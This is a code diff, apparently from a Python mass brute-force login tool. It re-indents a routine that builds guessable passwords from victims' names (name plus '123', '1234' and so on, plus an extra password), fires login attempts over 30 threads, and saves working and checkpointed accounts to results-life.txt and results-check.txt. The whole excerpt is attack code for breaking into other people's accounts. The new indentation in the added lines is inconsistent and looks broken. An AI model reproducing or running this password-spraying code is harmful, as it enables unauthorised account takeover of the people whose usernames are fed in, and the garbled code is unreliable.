@@ -285,28 +285,28 @@ def mbf2d():
                                   with open('results-check.txt','a') as f:
                                           f.write(x+"\n")
 
-                         print("\n\033[00m[\033[92m✓\033[00m] Done")
-                         print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-life.txt")
-             except FileNotFoundError:
-                         exit("\033[00m[\033[91m!\033[00m] you not have a results")
-                   else:
-                         exit("\033[00m[\033[91m!\033[00m] wrong choice")
-                   print()
-                   expass = input("\033[90m> \033[00mExtra Password: \033[1;92m")
-                   with ThreadPoolExecutor(max_workers=30) as ex:
-                          for user in username:
-                                  users = user.split('|')
-                                  ss = users[0].split(' ')
-                                  for x in ss:
-                                          listpass = [
-                                                  str(x) + '12',
-                                                  str(x) + '123',
-                                                  str(x) + '1234',
-                                                  str(x) + '12345',
-                                                  ]
-                                          listpass.append(expass)
-                                          for passw in set(listpass):
-                                                  ex.submit(login,(users[1]),(passw))
+                           print("\n\033[00m[\033[92m✓\033[00m] Done")
+                           print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-life.txt")
+                   except FileNotFoundError:
+                           exit("\033[00m[\033[91m!\033[00m] you not have a results")
+              else:
+                           exit("\033[00m[\033[91m!\033[00m] wrong input")
+              print()
+              expass = input("\033[90m> \033[00mExtra Password: \033[1;92m")
+              with ThreadPoolExecutor(max_workers=30) as ex:
+                     for user in username:
+                             users = user.split('|')
+                             ss = users[0].split(' ')
+                             for x in ss:
+                                  listpass = [
+                                           str(x) + '12',
+                                           str(x) + '123',
+                                           str(x) + '1234',
+                                           str(x) + '12345',
+                                           ]
+                                    listpass.append(expass)
+                                    for passw in set(listpass):
+                                        ex.submit(login,(users[1]),(passw))
                    if check != 0 or result != 0:
                            time.sleep(0.1)
                            print("\033[1;94m===========================================\033[00m")
@@ -315,7 +315,7 @@ def mbf2d():
                            print("\033[00m[\033[91m{!}\033[00m]checkpoint : \033[93mresults-check.txt\033[00m")
                            print("\n\n")
                    
-                   else:
+              else:
                            time.sleep(0.1)
                            print("\033[94m=============================================\033[00m")
                            print("\n\033[00m[\033[92m✓\033[00m] siap")
